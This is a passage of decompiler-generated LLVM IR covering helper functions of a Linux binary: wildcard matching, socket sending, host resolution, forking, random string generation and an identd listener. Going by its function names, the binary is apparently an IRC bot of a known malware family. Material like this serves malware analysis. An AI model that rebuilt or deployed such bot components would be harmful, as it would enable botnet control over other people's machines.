  %storemerge8 = phi i32 [ 0, %dec_label_pc_80482d4 ], [ 1, %dec_label_pc_80482b4 ], [ 1, %dec_label_pc_80482ab ]
  br label %dec_label_pc_8048381

dec_label_pc_80482e6:                             ; preds = %dec_label_pc_804826f
  %v2_80482e9 = load i8, i8* %tmp14, align 1
  %v4_80482eb = icmp eq i8 %v2_80482e9, 0
  br i1 %v4_80482eb, label %dec_label_pc_8048318, label %dec_label_pc_80482ef

dec_label_pc_80482ef:                             ; preds = %dec_label_pc_80482e6
  %v1_80482f2 = add i32 %arg2, 1
  %v1_80482f6 = add i32 %v4_804825a, 1
  %v5_80482fb = inttoptr i32 %v1_80482f6 to i8*
  %v5_80482fc = call i32 @strwildmatch(i8* %v5_80482fb, i32 %v1_80482f2)
  %v1_8048304 = icmp ne i32 %v5_80482fc, 0
  %. = zext i1 %v1_8048304 to i32
  br label %dec_label_pc_8048318

dec_label_pc_8048318:                             ; preds = %dec_label_pc_80482ef, %dec_label_pc_80482e6
  %storemerge5 = phi i32 [ 1, %dec_label_pc_80482e6 ], [ %., %dec_label_pc_80482ef ]
  br label %dec_label_pc_8048381

dec_label_pc_8048320:                             ; preds = %dec_label_pc_8048275
  %v2_8048323 = load i8, i8* %arg1, align 1
  %v3_8048323 = zext i8 %v2_8048323 to i32
  %v2_804832e = call i32 @toupper(i32 %v3_8048323)
  store i32 %v2_804832e, i32* @ebx, align 4
  %v2_804833b = load i8, i8* %tmp14, align 1
  %v3_804833b = zext i8 %v2_804833b to i32
  %v2_8048346 = call i32 @toupper(i32 %v3_804833b)
  %v0_804834e = load i32, i32* @ebx, align 4
  %v12_804834e = icmp eq i32 %v0_804834e, %v2_8048346
  %v1_8048350 = icmp eq i1 %v12_804834e, false
  br i1 %v1_8048350, label %dec_label_pc_804837b, label %dec_label_pc_8048352

dec_label_pc_8048352:                             ; preds = %dec_label_pc_8048320
  %v1_8048355 = add i32 %arg2, 1
  %v1_8048359 = add i32 %v4_804825a, 1
  %v5_804835e = inttoptr i32 %v1_8048359 to i8*
  %v5_804835f = call i32 @strwildmatch(i8* %v5_804835e, i32 %v1_8048355)
  %v1_8048367 = icmp ne i32 %v5_804835f, 0
  %.9 = zext i1 %v1_8048367 to i32
  br label %dec_label_pc_804837b

dec_label_pc_804837b:                             ; preds = %dec_label_pc_8048352, %dec_label_pc_8048320
  %storemerge = phi i32 [ 1, %dec_label_pc_8048320 ], [ %.9, %dec_label_pc_8048352 ]
  br label %dec_label_pc_8048381

dec_label_pc_8048381:                             ; preds = %dec_label_pc_8048318, %dec_label_pc_80482db, %dec_label_pc_8048280, %dec_label_pc_804837b
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_80482db ], [ %storemerge5, %dec_label_pc_8048318 ], [ %v3_8048283, %dec_label_pc_8048280 ], [ %storemerge, %dec_label_pc_804837b ]
  %v3_8048384 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048384, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_804825d, { 2, 0, 1 }
  uselistorder i32 %v4_804825a, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @toupper, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048381, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80482db, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v4_8048392 = ptrtoint i32* %stack_var_12 to i32
  %v5_80483a4 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8056580.265 to i32), i32 %arg2, i32 %v4_8048392)
  %v3_80483b4 = call i32 @strlen(i8* bitcast (i8** @global_var_8056580.265 to i8*))
  %v5_80483c8 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8056580.265 to i32), i32 %v3_80483b4)
  ret i32 %v5_80483c8
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_80483de = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_80483de, i32* @global_var_8056980.266, align 128
  store i32 %v1_80483de, i32* @eax, align 4
  %v10_80483f0 = icmp eq i32 %v1_80483de, -1
  %v1_80483f3 = icmp eq i1 %v10_80483f0, false
  br i1 %v1_80483f3, label %dec_label_pc_8048438, label %dec_label_pc_80483f5

dec_label_pc_80483f5:                             ; preds = %entry
  %v1_80483fb = call i32 @gethostbyname(i32 %arg1)
  %v4_8048406 = icmp eq i32 %v1_80483fb, 0
  %v1_804840a = icmp eq i1 %v4_8048406, false
  br i1 %v1_804840a, label %dec_label_pc_8048416, label %dec_label_pc_804840c

dec_label_pc_804840c:                             ; preds = %dec_label_pc_80483f5
  %v1_8048411 = call i32 @exit(i32 0)
  br label %dec_label_pc_8048416

dec_label_pc_8048416:                             ; preds = %dec_label_pc_80483f5, %dec_label_pc_804840c
  %v1_8048419 = add i32 %v1_80483fb, 12
  %v2_8048419 = inttoptr i32 %v1_8048419 to i32*
  %v3_8048419 = load i32, i32* %v2_8048419, align 4
  %v1_8048421 = add i32 %v1_80483fb, 16
  %v2_8048421 = inttoptr i32 %v1_8048421 to i32*
  %v3_8048421 = load i32, i32* %v2_8048421, align 4
  %v1_8048424 = inttoptr i32 %v3_8048421 to i32*
  %v2_8048424 = load i32, i32* %v1_8048424, align 4
  %v3_8048430 = call i32 @bcopy(i32 %v2_8048424, i32 ptrtoint (i32* @global_var_8056980.266 to i32), i32 %v3_8048419)
  %v0_8048438.pre = load i32, i32* @global_var_8056980.266, align 128
  br label %dec_label_pc_8048438

dec_label_pc_8048438:                             ; preds = %entry, %dec_label_pc_8048416
  %v0_8048438 = phi i32 [ %v1_80483de, %entry ], [ %v0_8048438.pre, %dec_label_pc_8048416 ]
  ret i32 %v0_8048438

; uselistorder directives
  uselistorder i32 %v1_80483de, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048438, { 1, 0 }
  uselistorder label %dec_label_pc_8048416, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048445 = load i8, i8* @global_var_8056564.267, align 4
  %v1_8048445 = zext i8 %v0_8048445 to i32
  %v2_8048445 = load i32, i32* @eax, align 4
  %v3_8048445 = and i32 %v2_8048445, -256
  %v4_8048445 = or i32 %v3_8048445, %v1_8048445
  store i32 %v4_8048445, i32* @eax, align 4
  %v10_804844a = icmp eq i8 %v0_8048445, 1
  %v1_804844c = icmp eq i1 %v10_804844a, false
  br i1 %v1_804844c, label %dec_label_pc_804845a, label %dec_label_pc_8048500

dec_label_pc_804845a:                             ; preds = %entry
  %v0_804845a = call i32 @fork()
  %v4_8048462 = icmp eq i32 %v0_804845a, 0
  %v1_8048466 = icmp eq i1 %v4_8048462, false
  br i1 %v1_8048466, label %dec_label_pc_8048473, label %dec_label_pc_8048468

dec_label_pc_8048468:                             ; preds = %dec_label_pc_804845a
  br label %dec_label_pc_8048500

dec_label_pc_8048473:                             ; preds = %dec_label_pc_804845a
  %v0_8048473 = load i32, i32* @global_var_8056570.268, align 16
  %v1_8048478 = add i32 %v0_8048473, 1
  store i32 %v1_8048478, i32* @global_var_8056570.268, align 16
  %v1_8048483 = mul i32 %v0_8048473, 4
  %v2_8048484 = add i32 %v1_8048483, 8
  %v1_804848b = call i32 @malloc(i32 %v2_8048484)
  %v0_80484c19 = load i32, i32* @global_var_8056570.268, align 16
  %v6_80484ca11 = icmp eq i32 %v0_80484c19, 1
  br i1 %v6_80484ca11, label %dec_label_pc_80484cc, label %dec_label_pc_804849f

dec_label_pc_804849f:                             ; preds = %dec_label_pc_8048473, %dec_label_pc_804849f
  %storemerge12 = phi i32 [ %v4_80484be, %dec_label_pc_804849f ], [ 0, %dec_label_pc_8048473 ]
  %v2_80484a2 = mul i32 %storemerge12, 4
  %v5_80484a7 = add i32 %v2_80484a2, %v1_804848b
  store i32 %v5_80484a7, i32* @ecx, align 4
  %v0_80484b2 = load i32, i32* @global_var_8056f50.269, align 16
  %v2_80484b7 = add i32 %v0_80484b2, %v2_80484a2
  %v1_80484ba = inttoptr i32 %v2_80484b7 to i32*
  %v2_80484ba = load i32, i32* %v1_80484ba, align 4
  %v2_80484bc = inttoptr i32 %v5_80484a7 to i32*
  store i32 %v2_80484ba, i32* %v2_80484bc, align 4
  %v4_80484be = add i32 %storemerge12, 1
  %v0_80484c1 = load i32, i32* @global_var_8056570.268, align 16
  %v1_80484c6 = add i32 %v0_80484c1, -1
  %v6_80484ca = icmp ugt i32 %v1_80484c6, %v4_80484be
  br i1 %v6_80484ca, label %dec_label_pc_804849f, label %dec_label_pc_80484cc

dec_label_pc_80484cc:                             ; preds = %dec_label_pc_804849f, %dec_label_pc_8048473
  %v0_80484c1.lcssa = phi i32 [ %v0_80484c19, %dec_label_pc_8048473 ], [ %v0_80484c1, %dec_label_pc_804849f ]
  %v1_80484cf = add i32 %v1_804848b, -4
  %v2_80484d7 = mul i32 %v0_80484c1.lcssa, 4
  %v2_80484da = add i32 %v1_80484cf, %v2_80484d7
  %v2_80484df = inttoptr i32 %v2_80484da to i32*
  store i32 %v0_804845a, i32* %v2_80484df, align 4
  %v0_80484e1 = load i32, i32* @global_var_8056f50.269, align 16
  store i32 %v0_80484e1, i32* @eax, align 4
  %v1_80484ea = call i32 @free(i32 %v0_80484e1)
  store i32 %v1_804848b, i32* @global_var_8056f50.269, align 16
  br label %dec_label_pc_8048500

dec_label_pc_8048500:                             ; preds = %entry, %dec_label_pc_8048468, %dec_label_pc_80484cc
  %stack_var_-24.0 = phi i32 [ %v0_804845a, %dec_label_pc_80484cc ], [ %v0_804845a, %dec_label_pc_8048468 ], [ 1, %entry ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80484be, { 1, 0 }
  uselistorder i32 %v2_80484a2, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v0_80484c19, { 1, 0 }
  uselistorder i32 %v1_804848b, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048500, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804849f, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8048508 = load i32, i32* @ebx, align 4
  store i32 %v0_8048508, i32* %stack_var_-8, align 4
  %tmp24 = ptrtoint i8* %arg1 to i32
  %v1_8048529 = add i32 %tmp24, -1
  br label %dec_label_pc_8048526

dec_label_pc_804850e:                             ; preds = %dec_label_pc_8048526, %dec_label_pc_8048541
  %v3_8048518 = call i32 @strlen(i8* %arg1)
  %v2_8048520 = add i32 %v1_8048529, %v3_8048518
  %v1_8048523 = inttoptr i32 %v2_8048520 to i8*
  store i8 0, i8* %v1_8048523, align 1
  br label %dec_label_pc_8048526

dec_label_pc_8048526:                             ; preds = %entry, %dec_label_pc_804850e
  %v3_8048530 = call i32 @strlen(i8* %arg1)
  %v2_8048538 = add i32 %v1_8048529, %v3_8048530
  %v1_804853b = inttoptr i32 %v2_8048538 to i8*
  %v2_804853b = load i8, i8* %v1_804853b, align 1
  %v10_804853d = icmp eq i8 %v2_804853b, 13
  br i1 %v10_804853d, label %dec_label_pc_804850e, label %dec_label_pc_8048541

dec_label_pc_8048541:                             ; preds = %dec_label_pc_8048526
  %v3_804854b = call i32 @strlen(i8* %arg1)
  %v2_8048553 = add i32 %v1_8048529, %v3_804854b
  %v1_8048556 = inttoptr i32 %v2_8048553 to i8*
  %v2_8048556 = load i8, i8* %v1_8048556, align 1
  %v11_8048558 = icmp eq i8 %v2_8048556, 10
  br i1 %v11_8048558, label %dec_label_pc_804850e, label %dec_label_pc_804855c

dec_label_pc_804855c:                             ; preds = %dec_label_pc_8048541
  %v3_804855c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804855c, i32* @ebx, align 4
  %v1_8048560 = sext i8 %v2_8048556 to i32
  ret i32 %v1_8048560

; uselistorder directives
  uselistorder i8 %v2_8048556, { 1, 0 }
  uselistorder i32 %v1_8048529, { 1, 2, 0 }
  uselistorder i8* %arg1, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8048526, { 1, 0 }
  uselistorder label %dec_label_pc_804850e, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8048564 = load i32, i32* @esi, align 4
  %v0_8048565 = load i32, i32* @ebx, align 4
  store i32 %v0_8048565, i32* %stack_var_-12, align 4
  %v1_804856c = call i32 @rand(i32 %v0_8048565)
  %v2_804858e = sdiv i32 %v1_804856c, 5
  store i32 %v2_804858e, i32* @ebx, align 4
  %tmp30 = mul i32 %v2_804858e, -5
  %v2_80485a7 = add i32 %tmp30, %v1_804856c
  store i32 %v2_80485a7, i32* @esi, align 4
  %v1_80485b5 = add i32 %v2_80485a7, 4
  %v1_80485be = add i32 %v2_80485a7, 5
  %v2_80485c3 = call i32 @malloc(i32 %v1_80485be)
  %tmp31 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_80485c3, i32* %tmp31, align 4
  %v0_80485db.cast = inttoptr i32 %v2_80485c3 to i8*
  %v6_80485db = call i32 @memset(i8* %v0_80485db.cast, i32 0, i32 %v1_80485be)
  %v5_80485f0 = call i32 @fopen(i32 ptrtoint ([16 x i8]* @global_var_8054308.271 to i32), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_8054306.270, i32 0, i32 0))
  %v4_80485fb = icmp eq i32 %v5_80485f0, 0
  %v1_80485ff = icmp eq i1 %v4_80485fb, false
  br i1 %v1_80485ff, label %dec_label_pc_804867b, label %dec_label_pc_804866e.preheader

dec_label_pc_804866e.preheader:                   ; preds = %entry
  %v5_804867441 = icmp sgt i32 %v1_80485b5, 0
  br i1 %v5_804867441, label %dec_label_pc_804860a, label %dec_label_pc_8048795

dec_label_pc_804860a:                             ; preds = %dec_label_pc_804860a, %dec_label_pc_804866e.preheader
  %v4_804860f = phi i8* [ %v0_80485db.cast, %dec_label_pc_804866e.preheader ], [ %v3_8048795.pre.pre, %dec_label_pc_804860a ]
  %storemerge42 = phi i32 [ 0, %dec_label_pc_804866e.preheader ], [ %v4_804866b, %dec_label_pc_804860a ]
  %v5_804860f = ptrtoint i8* %v4_804860f to i32
  %v6_804860f = add i32 %v5_804860f, %storemerge42
  %v1_8048612 = call i32 @rand(i32 %storemerge42)
  %v2_8048635 = srem i32 %v1_8048612, 26
  %v1_8048666 = add nsw i32 %v2_8048635, 65
  %v11_8048666 = trunc i32 %v1_8048666 to i8
  %v3_8048669 = inttoptr i32 %v6_804860f to i8*
  store i8 %v11_8048666, i8* %v3_8048669, align 1
  %v4_804866b = add nuw nsw i32 %storemerge42, 1
  %exitcond = icmp eq i32 %v4_804866b, %v1_80485b5
  %v3_8048795.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond, label %dec_label_pc_8048795, label %dec_label_pc_804860a

dec_label_pc_804867b:                             ; preds = %entry
  %v1_804867b = call i32 @rand(i32 %v5_80485f0)
  %v1_8048682 = call i32 @rand(i32 %tmp15)
  %v5_8048689 = mul i32 %v1_804867b, %v1_8048682
  %v2_80486ad = sdiv i32 %v5_8048689, 12039
  store i32 %v2_80486ad, i32* @ebx, align 4
  %v1_80486d3 = mul nsw i32 %v2_80486ad, 4540
  store i32 %v1_80486d3, i32* @edx, align 4
  %tmp = mul i32 %v2_80486ad, -45402
  %v2_80486e9 = add i32 %v5_8048689, %tmp
  store i32 %v2_80486e9, i32* @esi, align 4
  %v1_80486f7 = add i32 %v2_80486e9, 1
  %v2_804870f = ptrtoint i32* %stack_var_-1060 to i32
  %tmp33 = bitcast i32* %stack_var_-1060 to i8*
  br label %dec_label_pc_8048721

dec_label_pc_8048704:                             ; preds = %dec_label_pc_8048721
  %v6_8048716 = call i32 @fgets(i8* %tmp33, i32 1024, i32 %v5_80485f0)
  %v4_804871e = add i32 %storemerge10, 1
  br label %dec_label_pc_8048721

dec_label_pc_8048721:                             ; preds = %dec_label_pc_804867b, %dec_label_pc_8048704
  %storemerge10 = phi i32 [ %v4_804871e, %dec_label_pc_8048704 ], [ 0, %dec_label_pc_804867b ]
  %v5_8048724 = sub i32 %storemerge10, %v1_80486f7
  %v11_8048724 = xor i32 %storemerge10, %v1_80486f7
  %v12_8048724 = xor i32 %v5_8048724, %storemerge10
  %v13_8048724 = and i32 %v12_8048724, %v11_8048724
  %v14_8048724 = icmp slt i32 %v13_8048724, 0
  %v16_8048724 = icmp slt i32 %v5_8048724, 0
  %v2_8048727 = icmp eq i1 %v16_8048724, %v14_8048724
  br i1 %v2_8048727, label %dec_label_pc_8048729, label %dec_label_pc_8048704

dec_label_pc_8048729:                             ; preds = %dec_label_pc_8048721
  %v6_804873a = call i32 @memset(i8* %tmp33, i32 0, i32 1024)
  %v6_8048754 = call i32 @fgets(i8* %tmp33, i32 1024, i32 %v5_80485f0)
  %v3_8048766 = call i32 @filter(i8* %tmp33)
  %v6_804877f = call i32 @memcpy(i8* %v0_80485db.cast, i32 %v2_804870f, i32 %v1_80485b5)
  %tmp34 = inttoptr i32 %v5_80485f0 to i32*
  %v3_804878d = call i32 @fclose(i32* %tmp34)
  br label %dec_label_pc_8048795

dec_label_pc_8048795:                             ; preds = %dec_label_pc_804860a, %dec_label_pc_804866e.preheader, %dec_label_pc_8048729
  %v3_8048795 = phi i8* [ %v0_80485db.cast, %dec_label_pc_8048729 ], [ %v0_80485db.cast, %dec_label_pc_804866e.preheader ], [ %v3_8048795.pre.pre, %dec_label_pc_804860a ]
  %v4_8048795 = ptrtoint i8* %v3_8048795 to i32
  %v2_804879b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804879b, i32* @ebx, align 4
  store i32 %v0_8048564, i32* @esi, align 4
  ret i32 %v4_8048795

; uselistorder directives
  uselistorder i32 %v5_8048724, { 1, 0 }
  uselistorder i32 %storemerge10, { 0, 1, 3, 2 }
  uselistorder i8* %tmp33, { 2, 1, 0, 3 }
  uselistorder i32 %v2_80486e9, { 1, 0 }
  uselistorder i32 %v2_80486ad, { 0, 2, 1 }
  uselistorder i32 %v4_804866b, { 1, 0 }
  uselistorder i32 %storemerge42, { 1, 0, 2 }
  uselistorder i32 %v5_80485f0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v0_80485db.cast, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_80485b5, { 2, 0, 1 }
  uselistorder i32 %v2_80485a7, { 2, 1, 0 }
  uselistorder i32 %v2_804858e, { 1, 0 }
  uselistorder i32 %v1_804856c, { 1, 0 }
  uselistorder label %dec_label_pc_8048795, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048721, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_80487b2 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_80487bd = icmp eq i32 %v3_80487b2, -1
  br i1 %v13_80487bd, label %dec_label_pc_80489fc, label %dec_label_pc_80487c7

dec_label_pc_80487c7:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  %v2_80487d2 = call i32 @htons(i16 113)
  %v2_80487ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_80487f3 = bitcast i32* %stack_var_-44 to i8*
  %v4_80487f3 = call i32 @memset(i8* %v3_80487f3, i32 0, i32 8)
  %v3_8048807 = call i32 @bind(i32 %v3_80487b2, i32 %v2_80487ec, i32 16)
  %v10_804880f = icmp eq i32 %v3_8048807, -1
  br i1 %v10_804880f, label %dec_label_pc_80489fc, label %dec_label_pc_8048818

dec_label_pc_8048818:                             ; preds = %dec_label_pc_80487c7
  %v2_8048820 = call i32 @listen(i32 %v3_80487b2, i32 1)
  store i32 %v2_8048820, i32* @eax, align 4
  %v10_8048828 = icmp eq i32 %v2_8048820, -1
  br i1 %v10_8048828, label %dec_label_pc_80489fc, label %dec_label_pc_8048831

dec_label_pc_8048831:                             ; preds = %dec_label_pc_8048818
  %v0_8048831 = call i32 @fork()
  %v1_8048836 = icmp eq i32 %v0_8048831, 0
  br i1 %v1_8048836, label %dec_label_pc_80489fc, label %dec_label_pc_804883e

dec_label_pc_804883e:                             ; preds = %dec_label_pc_8048831
  store i32 16, i32* %stack_var_-36, align 4
  %v2_8048845 = ptrtoint i32* %stack_var_-36 to i32
  %v2_8048848 = ptrtoint i32* %stack_var_-68 to i32
  %v3_8048853 = call i32 @accept(i32 %v3_80487b2, i32 %v2_8048848, i32 %v2_8048845)
  %v4_804885e = add i32 %v3_8048853, 1
  %v13_804885e = icmp eq i32 %v4_804885e, 0
  %v1_8048862 = icmp eq i1 %v13_804885e, false
  br i1 %v1_8048862, label %dec_label_pc_804886e.preheader, label %dec_label_pc_8048864

dec_label_pc_8048864:                             ; preds = %dec_label_pc_804883e
  %v1_8048869 = call i32 @exit(i32 0)
  br label %dec_label_pc_804886e.preheader

dec_label_pc_804886e.preheader:                   ; preds = %dec_label_pc_8048864, %dec_label_pc_804883e
  %v2_804886e = ptrtoint i32* %stack_var_-1228 to i32
  %v2_8048899 = udiv i32 %v3_8048853, 32
  %v1_80488a8 = urem i32 %v3_8048853, 32
  %v2_80488a8 = icmp eq i32 %v1_80488a8, 0
  %v2_80488d8 = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048907 = mul nuw nsw i32 %v2_8048899, 4
  %v3_8048907 = add nsw i32 %v2_8048907, -1224
  %v5_80488b0 = shl i32 1, %v1_80488a8
  br label %dec_label_pc_8048880.lr.ph

dec_label_pc_8048880.lr.ph:                       ; preds = %bb40, %dec_label_pc_804886e.preheader
  br label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_8048880.lr.ph, %dec_label_pc_8048880
  %storemerge5 = phi i32 [ 32, %dec_label_pc_8048880.lr.ph ], [ %v4_804888d, %dec_label_pc_8048880 ]
  %stack_var_-12.04 = phi i32 [ %v2_804886e, %dec_label_pc_8048880.lr.ph ], [ %v4_8048889, %dec_label_pc_8048880 ]
  %v1_8048883 = inttoptr i32 %stack_var_-12.04 to i32*
  store i32 0, i32* %v1_8048883, align 4
  %v4_8048889 = add i32 %stack_var_-12.04, 4
  %v4_804888d = add nsw i32 %storemerge5, -1
  %v4_8048890 = icmp eq i32 %v4_804888d, 0
  %v1_8048894 = icmp eq i1 %v4_8048890, false
  br i1 %v1_8048894, label %dec_label_pc_8048880, label %dec_label_pc_8048896

dec_label_pc_8048896:                             ; preds = %dec_label_pc_8048880
  store i32 %v2_8048899, i32* @ebx, align 4
  %v0_804889e = load i32, i32* @ebp, align 4
  %v4_804889e = add i32 %v3_8048907, %v0_804889e
  %v5_804889e = inttoptr i32 %v4_804889e to i32*
  %v6_804889e = load i32, i32* %v5_804889e, align 4
  br i1 %v2_80488a8, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_8048896
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_8048896, %bb
  %v0_80488b2 = phi i32 [ 1, %dec_label_pc_8048896 ], [ %v5_80488b0, %bb ]
  %v2_80488b2 = or i32 %v0_80488b2, %v6_804889e
  store i32 %v2_80488b2, i32* %v5_804889e, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_80488eb = call i32 @select(i32 %v4_804885e, i32 %v2_804886e, i32 0, i32 0, i32 %v2_80488d8)
  %v2_80488f3 = icmp slt i32 %v6_80488eb, 0
  %v1_80488f5 = icmp eq i1 %v2_80488f3, false
  br i1 %v1_80488f5, label %dec_label_pc_8048901, label %dec_label_pc_80488f7

dec_label_pc_80488f7:                             ; preds = %bb38
  %v1_80488fc = call i32 @exit(i32 0)
  br label %dec_label_pc_8048901

dec_label_pc_8048901:                             ; preds = %bb38, %dec_label_pc_80488f7
  %v0_8048907 = load i32, i32* @ebp, align 4
  %v4_8048907 = add i32 %v3_8048907, %v0_8048907
  %v5_8048907 = inttoptr i32 %v4_8048907 to i32*
  %v6_8048907 = load i32, i32* %v5_8048907, align 4
  br i1 %v2_80488a8, label %bb40, label %bb39

bb39:                                             ; preds = %dec_label_pc_8048901
  %v5_8048914 = lshr i32 %v6_8048907, %v1_80488a8
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_8048901, %bb39
  %v0_8048916 = phi i32 [ %v6_8048907, %dec_label_pc_8048901 ], [ %v5_8048914, %bb39 ]
  %v1_8048916 = urem i32 %v0_8048916, 2
  %v2_8048916 = icmp eq i32 %v1_8048916, 0
  %v1_804891b = icmp eq i1 %v2_8048916, false
  br i1 %v1_804891b, label %dec_label_pc_8048922, label %dec_label_pc_8048880.lr.ph

dec_label_pc_8048922:                             ; preds = %bb40
  %v2_8048929 = ptrtoint i32* %stack_var_-1092 to i32
  %v5_8048933 = call i32 @recv(i32 %v3_8048853, i32 %v2_8048929, i32 1024, i32 0)
  %tmp41 = icmp slt i32 %v5_8048933, 1
  br i1 %tmp41, label %dec_label_pc_804894a, label %dec_label_pc_8048944

dec_label_pc_8048944:                             ; preds = %dec_label_pc_8048922
  %v7_8048948 = icmp sgt i32 %v5_8048933, 19
  br i1 %v7_8048948, label %dec_label_pc_804894a, label %dec_label_pc_8048954

dec_label_pc_804894a:                             ; preds = %dec_label_pc_8048944, %dec_label_pc_8048922
  %v1_804894f = call i32 @exit(i32 0)
  br label %dec_label_pc_8048954

dec_label_pc_8048954:                             ; preds = %dec_label_pc_8048944, %dec_label_pc_804894a
  %v0_8048957 = load i32, i32* @ebp, align 4
  %v2_8048957 = add i32 %v5_8048933, -1088
  %v3_8048957 = add i32 %v2_8048957, %v0_8048957
  %v4_8048957 = inttoptr i32 %v3_8048957 to i8*
  store i8 0, i8* %v4_8048957, align 1
  %v0_8048963 = load i32, i32* @ebp, align 4
  %v2_8048963 = add i32 %v5_8048933, -1089
  %v3_8048963 = add i32 %v2_8048963, %v0_8048963
  %v4_8048963 = inttoptr i32 %v3_8048963 to i8*
  %v5_8048963 = load i8, i8* %v4_8048963, align 1
  %v10_804896a = icmp eq i8 %v5_8048963, 10
  br i1 %v10_804896a, label %dec_label_pc_804897d, label %dec_label_pc_804896e

dec_label_pc_804896e:                             ; preds = %dec_label_pc_8048954
  %v5_8048972 = load i8, i8* %v4_8048963, align 1
  %v10_8048979 = icmp eq i8 %v5_8048972, 13
  %v1_804897b = icmp eq i1 %v10_8048979, false
  br i1 %v1_804897b, label %dec_label_pc_8048989, label %dec_label_pc_804897d

dec_label_pc_804897d:                             ; preds = %dec_label_pc_804896e, %dec_label_pc_8048954
  store i8 0, i8* %v4_8048963, align 1
  %v0_804898f.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8048989

dec_label_pc_8048989:                             ; preds = %dec_label_pc_804896e, %dec_label_pc_804897d
  %v0_80489b1 = phi i32 [ %v0_8048963, %dec_label_pc_804896e ], [ %v0_804898f.pre, %dec_label_pc_804897d ]
  %v2_804898f = add i32 %v5_8048933, -1090
  %v3_804898f = add i32 %v2_804898f, %v0_80489b1
  %v4_804898f = inttoptr i32 %v3_804898f to i8*
  %v5_804898f = load i8, i8* %v4_804898f, align 1
  %v10_8048996 = icmp eq i8 %v5_804898f, 10
  br i1 %v10_8048996, label %dec_label_pc_80489ab, label %dec_label_pc_804899a

dec_label_pc_804899a:                             ; preds = %dec_label_pc_8048989
  %v5_80489a0 = load i8, i8* %v4_804898f, align 1
  %v10_80489a7 = icmp eq i8 %v5_80489a0, 13
  %v1_80489a9 = icmp eq i1 %v10_80489a7, false
  br i1 %v1_80489a9, label %dec_label_pc_80489b9, label %dec_label_pc_80489ab

dec_label_pc_80489ab:                             ; preds = %dec_label_pc_804899a, %dec_label_pc_8048989
  store i8 0, i8* %v4_804898f, align 1
  br label %dec_label_pc_80489b9

dec_label_pc_80489b9:                             ; preds = %dec_label_pc_804899a, %dec_label_pc_80489ab
  %v4_80489ce = call i32 @Send(i32 %v3_8048853, i32 ptrtoint ([25 x i8]* @global_var_8054318.273 to i32), i32 %v2_8048929)
  %v1_80489dc = call i32 @close(i32 %v3_8048853)
  %v1_80489ea = call i32 @close(i32 %v3_80487b2)
  %v1_80489f7 = call i32 @exit(i32 0)
  br label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_8048831, %dec_label_pc_8048818, %dec_label_pc_80487c7, %entry, %dec_label_pc_80489b9
  %v0_8048a00 = phi i32 [ 0, %dec_label_pc_8048831 ], [ %v2_8048820, %dec_label_pc_8048818 ], [ %v3_8048807, %dec_label_pc_80487c7 ], [ %v3_80487b2, %entry ], [ %v1_80489f7, %dec_label_pc_80489b9 ]
  ret i32 %v0_8048a00

; uselistorder directives
  uselistorder i32 %v5_8048933, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_8048929, { 1, 0 }
  uselistorder i32 %stack_var_-12.04, { 1, 0 }
  uselistorder i32 %v3_8048907, { 1, 0 }
  uselistorder i32 %v1_80488a8, { 2, 1, 0 }
  uselistorder i32 %v3_8048853, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32 %v2_8048820, { 1, 0, 2 }
